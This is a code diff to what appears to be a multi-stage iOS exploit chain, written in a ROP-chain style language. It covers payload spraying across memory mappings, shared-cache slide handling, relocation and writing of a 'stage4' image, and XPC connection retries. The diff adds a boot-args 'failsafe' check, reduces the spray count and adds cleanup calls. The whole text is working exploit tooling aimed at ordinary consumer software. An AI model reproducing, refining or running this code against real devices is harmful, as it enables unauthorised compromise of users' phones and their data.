@@ -1,6 +1,9 @@
 #include "config.h"
 #include "config2.h"
 
+extern IORegistryEntryFromPath;
+extern IORegistryEntryGetProperty;
+extern kIOMasterPortDefault;
 extern CFShow;
 extern _NSConcreteGlobalBlock;
 extern _dispatch_data_destructor_vm_deallocate;
@@ -25,6 +28,7 @@ extern printf [[regparm = 1]];
 extern sel_registerName;
 extern sleep;
 extern sprintf [[regparm = 2]];
+extern strstr;
 extern usleep;
 extern write;
 extern xpc_array_append_value;
@@ -39,6 +43,7 @@ extern xpc_dictionary_create;
 extern xpc_dictionary_set_int64;
 extern xpc_dictionary_set_string;
 extern xpc_dictionary_set_value;
+extern xpc_release;
 extern shared_cache_slide = 0; // XXX nasty trick to make our own relocator store the slide here
 
 /////////////// libc ///////////////
@@ -75,7 +80,7 @@ extern shared_cache_slide = 0; // XXX nasty trick to make our own relocator stor
 #define PAYLOAD_SIZE 0x1000
 #define PAYLOAD_COUNT_PER_BLOCK 4
 #define PAYLOAD_BLOCKS_PER_MAPPING 256
-#define PAYLOAD_MAPPING_COUNT 256
+#define PAYLOAD_MAPPING_COUNT 128//256
 
 #define block_size PAYLOAD_SIZE * PAYLOAD_COUNT_PER_BLOCK
 #define mapping_size block_size * PAYLOAD_BLOCKS_PER_MAPPING
@@ -87,6 +92,18 @@ extern shared_cache_slide = 0; // XXX nasty trick to make our own relocator stor
 [[stack]]munmap(FAKE_SHARED_CACHE_ADDR, FAKE_SHARED_CACHE_SIZE);
 
 printf("slide = 0x%lx\n", shared_cache_slide);
+
+// failsafe
+if (registry_entry = [[stack=0x2000]]IORegistryEntryFromPath(*kIOMasterPortDefault, "IODeviceTree:/options")) {
+    volatile boot_args_size = 512;
+    volatile boot_args = calloc(1, boot_args_size);
+    if !(IORegistryEntryGetProperty(registry_entry, "boot-args", boot_args, &boot_args_size)) {
+        printf("boot-args = %.*s\n", boot_args_size, boot_args);
+        if (strstr(boot_args, "i-can-haz-stable-system")) {
+            exit(11);
+        }
+    }
+}
 
 // relocate stage4
 // relocations are appended to the real image, starting with 0
@@ -123,7 +140,7 @@ write(fd4_, &stage4_begin, stage4_size);
 close(fd4);
 
 // XXX make sure we got all the objective-c stuff ready
-[[stack=0x2000]]dlopen("/System/Library/Frameworks/Foundation.framework/Foundation", RTLD_LAZY);
+dlopen("/System/Library/Frameworks/Foundation.framework/Foundation", RTLD_LAZY);
 
 /*
 pivot_from_10:
@@ -334,7 +351,11 @@ do {
     if !(access(STAGE4_FLAG, F_OK)) {
         break;
     }
+
+    xpc_release(link);
+    xpc_release(client);
+    xpc_release(conn);
+    sleep(1);
 } while (retry = retry - 1);
 
-done:
 exit(42);
